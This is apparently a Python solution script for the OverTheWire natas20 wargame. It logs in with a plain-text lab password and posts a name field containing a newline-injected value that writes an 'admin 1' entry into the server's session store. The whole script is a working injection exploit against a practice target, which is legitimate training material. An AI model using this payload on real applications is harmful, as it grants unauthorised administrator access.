import requests
from requests.auth import HTTPBasicAuth

url = "http://natas20.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas20", "slOKYGsjlJhaqKliGvrgWAzln0JyrWao")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

payload = 'user\nadmin 1'

session.post(url, auth=auth, data={"name": payload}, params={"debug": "1"})
sessionID = session.cookies.get_dict().get('PHPSESSID')

print(f"Session ID 1st request: {sessionID}")

response = session.get(url, auth=auth, params={"debug": "1"})
print(f"Session ID 2nd request: {sessionID}\n")
print(response.text)
